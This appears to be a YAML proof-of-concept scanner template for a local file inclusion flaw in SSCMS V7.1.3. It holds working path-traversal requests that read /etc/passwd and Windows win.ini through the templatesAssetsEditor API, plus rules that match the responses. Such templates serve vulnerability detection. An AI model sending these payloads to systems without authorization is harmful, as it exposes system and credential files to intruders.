name: poc-yaml-sscms-templatesassetseditor-fileread
binding: 0ef1e683-4a8a-4d0f-82da-a2fce72afaf0
manual: true
detail:
    author: secking
    links:
        - https://github.com/siteserver/cms/issues/3491
    vulnerability:
        id: CT-529807
        level: high
    description: SSCMS! SSCMS V7.1.3 is vulnerable to local file inclusion via the fileName parameter.
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/admin/cms/templates/templatesAssetsEditor?siteId=1&directoryPath=&fileName=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /api/admin/cms/templates/templatesAssetsEditor?siteId=1&directoryPath=C://&fileName=Windows%5Cwin.ini&fileType=html
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
